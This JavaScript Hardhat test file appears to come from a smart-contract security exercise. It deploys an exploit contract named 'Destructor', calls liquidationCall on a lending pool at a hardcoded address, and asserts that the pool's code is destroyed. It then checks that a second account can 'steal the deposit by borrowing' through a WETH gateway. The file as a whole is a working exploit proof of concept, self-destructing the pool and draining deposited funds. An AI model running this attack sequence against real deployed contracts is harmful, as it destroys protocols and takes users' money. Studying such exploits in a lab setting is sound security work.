const { assert } = require("chai");
const lendingPoolAddress = "0x987115C38Fd9Fd2aA2c6F1718451D167c13a3186";
const wethGatewayAddress = "0xDcD33426BA191383f1c9B431A342498fdac73488";
const wethAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

describe("Pool", function () {
    let contract;
    let pool;
    before(async () => {
        pool = await ethers.getContractAt("ILendingPool", lendingPoolAddress);

        const Destructor = await ethers.getContractFactory("Destructor");
        let exploit = await Destructor.deploy();
        await exploit.deployed();

        const Contract = await ethers.getContractFactory("Contract");
        contract = await Contract.deploy();
        await contract.deployed();
    });

    it("should be deployed", async function () {
        assert.notEqual(await ethers.provider.getCode(pool.address), "0x", "Expected the pool to be deployed");
    });

    describe('after liquidation call', () => {
        before(async () => {
            const z = ethers.constants.AddressZero;
            await pool.liquidationCall(z, z, z, 0, true);
        });

        it("should be destroyed", async function () {
            assert.equal(await ethers.provider.getCode(pool.address), "0x", "Expected the pool to be destroyed");
        });
    });

    describe('depositing into wethGateway', () => {
      const deposit = ethers.utils.parseEther("10");
      let gateway, weth;
      before(async () => {
        gateway = await ethers.getContractAt("IWETHGateway", wethGatewayAddress);
        weth = await ethers.getContractAt("IERC20", wethAddress);
        const onBehalfOf = await ethers.provider.getSigner(0).getAddress();
        await gateway.depositETH(onBehalfOf, 0, { value: deposit });
      });

      it('should hold the deposit in the pool', async () => {
        const balance = await weth.balanceOf(gateway.address);
        assert.equal(balance.toString(), deposit.toString());
      });

      it('should allow anyone to steal the deposit by borrowing', async () => {
        const signer1 = ethers.provider.getSigner(1);
        const address1 = await signer1.getAddress();

        const balanceBefore = await ethers.provider.getBalance(address1);
        const tx = await gateway.connect(signer1).borrowETH(deposit, 0, 0);
        const receipt = await tx.wait();
        const gasCost = tx.gasPrice.mul(receipt.gasUsed);
        const balanceAfter = await ethers.provider.getBalance(address1);
        const actual = balanceAfter.sub(balanceBefore).add(gasCost);

        assert.equal(actual.toString(), deposit.toString());
      });
    });
});
